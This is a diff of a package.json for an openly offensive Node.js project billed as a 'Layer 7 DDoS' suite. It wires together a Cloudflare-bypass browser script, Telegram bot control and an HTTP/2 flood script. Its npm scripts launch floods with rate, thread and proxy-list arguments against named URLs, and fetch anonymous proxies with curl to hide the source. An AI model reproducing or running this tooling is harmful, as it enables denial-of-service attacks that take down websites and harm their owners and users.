@@ -1,23 +1,28 @@
 {
-  "name": "layer7-ddos-suite-pro",
-  "version": "2.0.0",
-  "description": "DDoS Layer 7 PRO: Bypass Cloudflare + Telegram Bot + proxy1.txt mặc định",
+  "name": "layer7-ddos-pro-suite",
+  "version": "3.0.0",
+  "description": "DDoS Layer 7 PRO: browser.js (bypass) + bot.js (Telegram) + floodbrs1.js (HTTP/2 flood)",
   "main": "bot.js",
   "scripts": {
     "start": "node bot.js",
     "browser": "node browser.js",
-    "dev": "nodemon bot.js",
+    "flood": "node floodbrs1.js",
+    "test-uam": "node browser.js https://uam.dstatbot.win/e230c7bb-0888-432c-97dc-4e3db173405e 10 proxy1.txt 100 60",
+    "test-http2": "node floodbrs1.js https://dstatbot.win 60 500 10 proxy1.txt \"\" \"Mozilla/5.0\" \"valid\"",
+    "install-chromium": "npx puppeteer-install",
     "clean": "rm -rf node_modules package-lock.json",
-    "reinstall": "npm run clean && npm install",
-    "install-chromium": "npx puppeteer-install"
+    "reinstall": "npm run clean && npm install && npm run install-chromium",
+    "proxy": "curl -s https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=elite > proxy1.txt"
   },
   "keywords": [
     "ddos",
+    "layer7",
     "cloudflare",
     "bypass",
+    "http2",
+    "puppeteer",
     "telegram",
-    "bot",
-    "puppeteer"
+    "flood"
   ],
   "author": "ProSec",
   "license": "MIT",
@@ -25,12 +30,16 @@
     "node": ">=18.0.0"
   },
   "dependencies": {
+    "puppeteer": "^23.6.0",
     "puppeteer-extra": "^3.3.6",
     "puppeteer-extra-plugin-stealth": "^2.11.2",
     "node-telegram-bot-api": "^0.66.0",
     "async": "^3.2.5",
     "chalk": "^4.1.2",
-    "fs-extra": "^11.2.0"
+    "fs-extra": "^11.2.0",
+    "colors": "^1.4.0",
+    "cluster": "^0.0.1",
+    "http2": "^3.3.7"
   },
   "devDependencies": {
     "nodemon": "^3.1.7"
